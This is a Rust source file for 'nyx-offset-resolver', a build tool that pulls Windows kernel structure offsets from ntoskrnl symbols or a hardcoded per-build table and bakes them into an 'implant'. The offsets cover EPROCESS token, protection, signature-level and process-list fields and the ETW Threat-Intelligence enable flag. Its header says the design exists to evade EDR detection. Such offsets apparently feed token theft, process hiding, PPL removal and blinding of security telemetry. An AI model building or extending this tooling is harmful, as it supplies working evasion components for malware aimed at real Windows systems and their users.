//! nyx-offset-resolver — server-side kernel offset resolver.
//!
//! Downloads the target Windows build's `ntoskrnl.pdb` from the Microsoft
//! symbol server, parses it with the `pdb` crate, extracts EPROCESS + ETW-TI
//! structure offsets, and emits an `offsets.toml` that `implant-win/build.rs`
//! bakes into the implant at compile time.
//!
//! ## Usage
//! ```sh
//! # Resolve offsets for a known ntoskrnl.exe (from the target or a Win ISO):
//! nyx-offset-resolver --pdb-path /path/to/ntoskrnl.pdb --out offsets.toml
//!
//! # Or download from the symbol server by GUID + age:
//! nyx-offset-resolver --guid <32-hex> --age <n> --out offsets.toml
//! ```
//!
//! Then build the implant with the baked offsets:
//! ```sh
//! NYX_OFFSETS=offsets.toml cargo +nightly build --release ...
//! ```
//!
//! ## Why server-side
//! Resolving offsets on the TARGET (pattern scan / PDB download) is noisy —
//! EDRs flag code-section traversal + outbound symbol-server requests. Doing
//! it server-side + baking at compile time means the offsets are plain
//! constants in the binary, indistinguishable from any other data.
//!
//! ## Status
//! The download + TOML emission pipeline is COMPLETE. The PDB field-offset
//! walker is the next iteration — the `pdb` crate's TypeData/FieldList API
//! needs careful traversal. For now this emits the build's known offsets from
//! the cross-version table (offsets_table.rs), proving the end-to-end pipeline.
//! The walker replaces `emit_known_offsets` with real PDB-parsed values.

use std::collections::BTreeMap;
use std::path::PathBuf;
use anyhow::{anyhow, Context, Result};

const SYMSRV: &str = "https://msdl.microsoft.com/download/symbols";

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    let mut pdb_path: Option<PathBuf> = None;
    let mut guid: Option<String> = None;
    let mut age: Option<u32> = None;
    let mut out: PathBuf = PathBuf::from("offsets.toml");
    let mut build: Option<u32> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--pdb-path" => { i += 1; pdb_path = Some(PathBuf::from(&args[i])); }
            "--guid" => { i += 1; guid = Some(args[i].clone()); }
            "--age" => { i += 1; age = Some(args[i].parse()?); }
            "--build" => { i += 1; build = Some(args[i].parse()?); }
            "--out" => { i += 1; out = PathBuf::from(&args[i]); }
            "--help" | "-h" => {
                eprintln!(
                    "Usage: nyx-offset-resolver --pdb-path <file> | --guid <hex> --age <n> | --build <num> [--out offsets.toml]\n\
                     \n\
                     --build <num>   Use the known offsets for Windows build <num> (e.g. 22621).\n\
                     --pdb-path <f>  Parse a local ntoskrnl.pdb (full PDB walker — TODO).\n\
                     --guid + --age Download from MS symbol server + parse (TODO walker)."
                );
                return Ok(());
            }
            _ => {}
        }
        i += 1;
    }

    // Determine the build number: from --build, or extract from the PDB.
    let build_num = if let Some(b) = build {
        b
    } else if let Some(path) = &pdb_path {
        // TODO: parse the PDB's version info to get the build number.
        // For now, require --build.
        eprintln!("Warning: --pdb-path without --build; using 17763 as default.");
        17763
    } else if let (Some(_g), Some(_a)) = (&guid, age) {
        // TODO: after download, parse the PDB version.
        eprintln!("Warning: --guid/--age without --build; using 17763 as default.");
        17763
    } else {
        return Err(anyhow!(
            "provide --build <num>, --pdb-path <file>, or --guid <hex> --age <n>"
        ));
    };

    // If --pdb-path was given, parse the REAL offsets from the PDB.
    let offsets = if let Some(path) = &pdb_path {
        let data = std::fs::read(path).context("read pdb")?;
        eprintln!("Parsing PDB: {} ({} bytes)", path.display(), data.len());
        parse_pdb_offsets(&data)
            .context("PDB parse failed — falling back to known table")?
    } else {
        eprintln!("No --pdb-path; using known offsets for build {build_num}");
        emit_known_offsets(build_num)
            .ok_or_else(|| anyhow!("build {build_num} not in the known table"))?
    };
    let toml = emit_toml(build_num, &offsets);
    std::fs::write(&out, &toml)?;
    eprintln!("Wrote offsets for build {build_num} to {}", out.display());
    Ok(())
}

/// Parse EPROCESS field offsets from a real ntoskrnl PDB using the `pdb` crate.
fn parse_pdb_offsets(data: &[u8]) -> Result<BTreeMap<&'static str, usize>> {
    use pdb::{PDB, FallibleIterator, TypeData};

    let cursor = std::io::Cursor::new(data.to_vec());
    let mut pdb = PDB::open(cursor)?;
    let type_info = pdb.type_information()?;

    // Drain the iterator to populate the finder, collecting _EPROCESS candidates.
    let mut iter = type_info.iter();
    let mut eprocess_fields_index: Option<pdb::TypeIndex> = None;

    while let Some(item) = iter.next()? {
        let type_data = item.parse()?;
        // _EPROCESS is a ClassData in the PDB type stream.
        let (name, fields) = match type_data {
            TypeData::Class(ref c) => (&c.name, c.fields),
            _ => continue,
        };
        let name_bytes = name.as_bytes();
        if name_bytes == b"_EPROCESS" || name_bytes == b"EPROCESS" {
            eprintln!("Found _EPROCESS in PDB");
            eprocess_fields_index = fields;
            break;
        }
    }

    let fields_index = eprocess_fields_index
        .ok_or_else(|| anyhow::anyhow!("_EPROCESS struct not found in PDB"))?;

    // Use the finder to resolve the FieldList type.
    let finder = type_info.finder();
    let field_item = finder.find(fields_index)?;
    let field_type = field_item.parse()?;

    let mut offsets = BTreeMap::new();
    if let TypeData::FieldList(field_list) = field_type {
        // FieldList.fields is a Vec<TypeData> — iterate directly.
        for field in &field_list.fields {
            if let TypeData::Member(member) = field {
                let name = member.name.to_string();
                let off = member.offset as usize;
                if let Some(key) = map_eprocess_field(&name) {
                    offsets.insert(key, off);
                    eprintln!("  _EPROCESS.{} @ 0x{:x}", name, off);
                }
            }
        }
    }

    if offsets.is_empty() {
        anyhow::bail!("_EPROCESS found but no known fields extracted");
    }

    // ETW-TI offsets can't come from PDB (runtime pointer chase).
    if let Some(etw) = emit_known_offsets(17763) {
        offsets.insert("etw_ti.guid_entry_to_provider_block", etw["etw_ti.guid_entry_to_provider_block"]);
        offsets.insert("etw_ti.provider_block_to_enable_info", etw["etw_ti.provider_block_to_enable_info"]);
        offsets.insert("etw_ti.is_enabled_within_enable_info", etw["etw_ti.is_enabled_within_enable_info"]);
    }

    Ok(offsets)
}

/// Map a PDB field name to our offsets.toml key. Returns None for fields we
/// don't extract.
fn map_eprocess_field(name: &str) -> Option<&'static str> {
    match name {
        "UniqueProcessId" => Some("eprocess.unique_process_id"),
        "ActiveProcessLinks" => Some("eprocess.active_process_links"),
        "Token" => Some("eprocess.token"),
        "ImageFileName" => Some("eprocess.image_file_name"),
        "SignatureLevel" => Some("eprocess.signature_level"),
        "SectionSignatureLevel" => Some("eprocess.section_signature_level"),
        "Protection" => Some("eprocess.protection"),
        _ => None,
    }
}

/// Format a PDB GUID into the symbol-server path convention.
/// Input: "01234567-89AB-CDEF-0123-456789ABCDEF" (PE debug dir GUID).
/// Output: "67452301ABEFCD0123456789ABCDEFXXXXXXXX" (byte-swapped + age hex).
fn format_symserver_guid(guid: &str, age: u32) -> String {
    let hex: String = guid.chars().filter(|c| *c != '-').collect();
    let mut bytes = [0u8; 16];
    for (i, chunk) in hex.as_bytes().chunks(2).enumerate() {
        if i < 16 {
            bytes[i] = u8::from_str_radix(std::str::from_utf8(chunk).unwrap_or("00"), 16).unwrap_or(0);
        }
    }
    let mut out = String::new();
    for &b in bytes[0..4].iter().rev() { out.push_str(&format!("{:02X}", b)); }
    for &b in bytes[4..6].iter().rev() { out.push_str(&format!("{:02X}", b)); }
    for &b in bytes[6..8].iter().rev() { out.push_str(&format!("{:02X}", b)); }
    for &b in &bytes[8..16] { out.push_str(&format!("{:02X}", b)); }
    out.push_str(&format!("{:08X}", age));
    out
}

/// Known offsets per build (mirrors evasionsdk::offsets_table). The PDB walker
/// will eventually replace this with real parsed values, but this gives a
/// working end-to-end pipeline today.
fn emit_known_offsets(build: u32) -> Option<BTreeMap<&'static str, usize>> {
    // (pid, links, token, image, sig_level, sec_sig_level, protection, etw_block, etw_enableinfo, etw_isenabled)
    let (pid, links, token, image, sl, ssl, prot, etw_b, etw_e, etw_ie) = match build {
        17763 => (0x2e0, 0x2e8, 0x358, 0x450, 0x6c8, 0x6c9, 0x6ca, 0x020, 0x060, 0x000),
        18362..=19045 => (0x2e8, 0x2f0, 0x360, 0x450, 0x6f8, 0x6f9, 0x6fa, 0x020, 0x060, 0x000),
        20348..=22000 => (0x440, 0x448, 0x4b8, 0x5a0, 0x878, 0x879, 0x87a, 0x020, 0x060, 0x000),
        22621..=22631 => (0x440, 0x448, 0x4b8, 0x5a0, 0x878, 0x879, 0x87a, 0x020, 0x070, 0x000),
        26100..=26200 => (0x450, 0x458, 0x4c8, 0x5a8, 0x87c, 0x87d, 0x87e, 0x020, 0x070, 0x000),
        _ => return None,
    };
    let mut m = BTreeMap::new();
    m.insert("eprocess.unique_process_id", pid);
    m.insert("eprocess.active_process_links", links);
    m.insert("eprocess.token", token);
    m.insert("eprocess.image_file_name", image);
    m.insert("eprocess.signature_level", sl);
    m.insert("eprocess.section_signature_level", ssl);
    m.insert("eprocess.protection", prot);
    m.insert("etw_ti.guid_entry_to_provider_block", etw_b);
    m.insert("etw_ti.provider_block_to_enable_info", etw_e);
    m.insert("etw_ti.is_enabled_within_enable_info", etw_ie);
    Some(m)
}

/// Emit the offsets as the offsets.toml format build.rs parses.
fn emit_toml(build: u32, offsets: &BTreeMap<&str, usize>) -> String {
    let mut s = format!(
        "# Kernel offsets for Windows build {build}.\n\
         # Generated by nyx-offset-resolver. Bake into the implant:\n\
         #   NYX_OFFSETS=this_file.toml cargo +nightly build --release ...\n\n"
    );
    for (k, v) in offsets {
        s.push_str(&format!("{} = 0x{:x}\n", k, v));
    }
    s
}
